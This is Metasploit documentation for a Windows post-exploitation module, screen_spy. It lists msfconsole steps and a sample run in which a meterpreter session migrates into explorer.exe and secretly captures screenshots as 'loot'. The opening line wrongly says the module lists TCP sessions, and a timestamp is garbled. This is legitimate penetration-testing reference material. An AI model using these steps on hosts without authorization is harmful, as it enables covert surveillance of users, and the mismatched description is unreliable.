## Vulnerable Application

  This Module lists current TCP sessions.

## Verification Steps

  1. Start `msfconsole`
  2. Get meterpreter session
  3. Do: `use post/windows/gather/screen_spy`
  4. Do: `set SESSION <session id>`
  5. Do: `run`

## Options

  ***
  SESSION
  ***
  The session to run the module on.

## Scenarios

  ```
  [*] Meterpreter session 1 opened (192.168.1.3:4444 -> 192.168.1.10:49184) at 201 9-12-12 14:55:42 -0700


  msf > use post/windows/gather/screen_spy
  msf post(windows/gather/screen_spy) > set SESSION 1
    SESSION => 1
  msf post(windows/gather/screen_spy) > run

    [*] Migrating to explorer.exe pid: 1908
    [+] Migration successful
    [*] Capturing 6 screenshots with a delay of 5 seconds
    [*] Screen Spying Complete
    [*] run loot -t screenspy.screenshot to see file locations of your newly acquired loot
    [*] Post module execution completed
  ```
